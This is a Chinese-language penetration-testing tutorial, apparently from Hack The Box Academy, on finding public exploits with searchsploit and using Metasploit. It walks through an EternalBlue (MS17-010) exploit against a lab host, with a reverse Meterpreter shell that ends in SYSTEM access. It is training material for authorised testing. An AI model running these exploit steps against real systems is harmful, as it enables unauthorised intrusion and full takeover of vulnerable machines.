---
title: 公开漏洞利用
---

# 公共漏洞利用

---

一旦我们确定了从我们的`Nmap`扫描中识别出的端口上运行的服务，第一步是查看这些应用程序/服务是否存在任何公共漏洞。公共漏洞可能存在于Web应用程序和运行在开放端口（如`SSH`或`ftp`）上的其他应用程序中。

---

## 查找公共漏洞

在枚举阶段，有许多工具可以帮助我们搜索针对我们可能遇到的各种应用程序和服务的公共漏洞。一种方法是使用`exploit`与应用程序名称一起在Google上搜索，看看是否能得到任何结果。

![](https://gwmah9jwtul.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjQ0NGViMWU0OGNmNGYyZDE3MDc1NDcxZjNjOTI4MzBfblcwS3hDNmpvdEllNnFtbTE1MHRoMFVVOVBGQmgxcjlfVG9rZW46WXA1bWJtd0Nnb29ZZ014VjMwa2Nmc05zbjNlXzE2ODY0OTYwMjM6MTY4NjQ5OTYyM19WNA)

这个目的的一个著名工具是`searchsploit`，我们可以使用它来搜索任何应用程序的公共漏洞/利用。我们可以使用以下命令安装它：

```Plaintext
jw0610a@htb[/htb]$ sudo apt install exploitdb -y
```

然后，我们可以使用`searchsploit`按名称搜索特定应用程序，如下所示：

```Plaintext
jw0610a@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

我们还可以利用在线漏洞数据库搜索漏洞，如[Exploit DB](https://www.exploit-db.com)、[Rapid7 DB](https://www.rapid7.com/db/)或[Vulnerability Lab](https://www.vulnerability-lab.com)。[Intro to Web Applications](https://academy.hackthebox.com/module/details/75)模块讨论了Web应用程序的公共漏洞。

---

## Metasploit入门

Metasploit框架（MSF）是一款优秀的渗透测试工具。它包含许多内置的利用程序，用于许多公共漏洞，并提供了

一种方便的方式来使用这些利用程序对易受攻击的目标进行攻击。MSF还具有许多其他功能，例如：

- 运行侦察脚本以枚举远程主机和受损目标
    
- 验证脚本，以测试漏洞的存在性，而无需实际攻击目标
    
- Meterpreter，它是一个连接到shell并在受损目标上运行命令的强大工具
    
- 许多后渗透和枢纽工具
    

让我们以搜索我们正在攻击的应用程序的漏洞为例，以及如何利用它。要运行`Metasploit`，我们可以使用`msfconsole`命令：

```Plaintext
jw0610a@htb[/htb]$ msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```

一旦我们运行了`Metasploit`，我们可以使用`search exploit`命令搜索我们的目标应用程序。例如，我们可以搜索之前识别到的SMB漏洞：

```Plaintext
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010         
```

我们找到了一个针对该服务的漏洞利用。我们可以通过复制其完整名称并使用`USE`来使用它：

```Plaintext
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

在运行漏洞利用之前，我们需要配置其选项。要查看可配置的选项，我们可以使用`show options`命令：

```Plaintext
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

任何`Required`设置为`yes`的选项都需要设置才能使漏洞利用工作。在这种情况下，我们只有两个选项需要设置：`RHOSTS`，即我们目标的IP（这可以是一个IP、多个IP或包含IP列表的文件）。我们可以使用`set`命令来设置它们：

```Plaintext
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

一旦两个选项都设置好了，我们就可以开始利用了。但是，在运行脚本之前，我们可以先运行一个检查来确保服务器存在漏洞：

```Plaintext
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

  

正如我们看到的，服务器确实存在漏洞。请注意，并非`Metasploit Framework`中的每个漏洞利用都支持`check`功能。最后，我们可以使用`run`或`exploit`命令运行漏洞利用：

```Plaintext
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

正如我们可以看到的，我们已经能够获得对该主机的管理员访问权限，并使用`shell`命令进入交互式shell。这些是使用`Metasploit`来利用远程服务器上的漏洞的基本示例。在Hack The Box平台上有许多退役的机器非常适合练习使用Metasploit。其中一些包括，但不限于：

- Granny/Grandpa
    
- Jerry
    
- Blue
    
- Lame
    
- Optimum
    
- Legacy
    
- Devel
    

稍后，在本模块中，我们将逐步介绍`Nibbles`机器，并展示如何使用`Metasploit`进行利用。`Metasploit`是一个必备的工具，但重要的是不能仅仅依赖它。作为全面发展的测试人员，我们必须知道如何最大限度地利用所有可用的工具，了解为什么有时它们会失败，并知道何时转向手动技术或其他工具。